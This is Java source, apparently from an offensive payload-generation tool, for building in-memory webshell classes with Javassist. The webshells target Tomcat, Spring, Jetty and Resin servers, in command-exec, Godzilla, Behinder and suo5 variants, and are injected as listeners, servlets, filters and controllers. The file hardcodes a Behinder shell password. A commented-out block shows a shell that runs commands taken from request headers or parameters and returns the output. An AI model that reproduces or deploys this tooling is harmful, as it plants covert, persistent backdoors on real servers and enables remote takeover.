package com.ppp.middleware.builder;

import com.ppp.JavaClassHelper;
import com.ppp.annotation.Builder;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import com.ppp.annotation.Middleware;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

/**
 * @author Whoopsunix
 */
@Builder(Builder.MS)
public class MSJavaClassBuilder {
    /**
     * Tomcat
     */
    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        tomcatListenerResponseMaker(ctClass);

        // run
//        CtMethod runCtMethod = ctClass.getDeclaredMethod("run");
//        runCtMethod.setBody("{try {\n" +
//                "    Object httpServletRequest = invokeMethod($1, \"getServletRequest\", new Class[]{}, new Object[]{});\n" +
//                "    Object header =  invokeMethod(httpServletRequest, \"getHeader\", new Class[]{String.class}, new Object[]{HEADER});\n" +
//                "    Object param = invokeMethod(httpServletRequest, \"getParameter\", new Class[]{String.class}, new Object[]{PARAM});\n" +
//                "    String str = null;\n" +
//                "    if (header != null) {\n" +
//                "        str = (String) header;\n" +
//                "    } else if (param != null) {\n" +
//                "        str = (String) param;\n" +
//                "    }\n" +
//                "    String result = exec(str);\n" +
//                "    Object response = getResponse(httpServletRequest);\n" +
//                "    invokeMethod(response, \"setStatus\", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});\n" +
//                "    Object writer = invokeMethod(response, \"getWriter\", new Class[]{}, new Object[]{});\n" +
//                "    invokeMethod(writer, \"println\", new Class[]{String.class}, new Object[]{result});\n" +
//                "} catch (Exception ignored) {\n" +
////                "    ignored.printStackTrace();\n" +
//                "}}");

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] tomcatListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        tomcatListenerResponseMaker(ctClass);


        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] tomcatListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        tomcatListenerResponseMaker(ctClass);

        behinderMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] tomcatListenerSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        tomcatListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    public void tomcatListenerResponseMaker(CtClass ctClass) throws Exception {
        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
        responseCtMethod.setBody("{        try {\n" +
                "            $1 = getFieldValue($1, \"request\");\n" +
                "        }catch (Exception e){\n" +
                "        }\n" +
                "        Object httpServletResponse = getFieldValue($1, \"response\");\n" +
                "        return httpServletResponse;}");
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] tomcatFilterSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Executor)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatExecutorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    /**
     * Spring
     */
    @Middleware(Middleware.Spring)
    @MemShell(MemShell.Controller)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] springControllerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    /**
     * Jetty
     */
    @Middleware(Middleware.Jetty)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] jettyListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        jettyListenerResponseMaker(ctClass);


        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Jetty)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] jettyListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        jettyListenerResponseMaker(ctClass);


        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    public void jettyListenerResponseMaker(CtClass ctClass) throws Exception {
        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
        responseCtMethod.setBody("{Object channel = getFieldValue($1, \"_channel\");\n" +
                "return getFieldValue(channel, \"_response\");}");
    }

    /**
     * Resin
     */
    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] resinListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        resinListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] resinListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        resinListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] resinListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        resinListenerResponseMaker(ctClass);

        behinderMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] resinListenerSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        resinListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] resinServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] resinServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] resinServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] resinServletSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] resinFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] resinFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] resinFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] resinFilterSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    public void resinListenerResponseMaker(CtClass ctClass) throws Exception {
        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
        responseCtMethod.setBody("{\n" +
                "return getFieldValue($1, \"_response\");}");
    }


    /**
     * 冰蝎 密码
     */
    public static void behinderMS(JavaClassHelper javaClassHelper) throws Exception {
        javaClassHelper.setPass("e45e329feb5d925b");
    }

    /**
     * 默认
     *
     * @param cls
     * @param javaClassHelper
     * @return
     * @throws Exception
     */
    public static byte[] defaultOriginalMS(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }


}
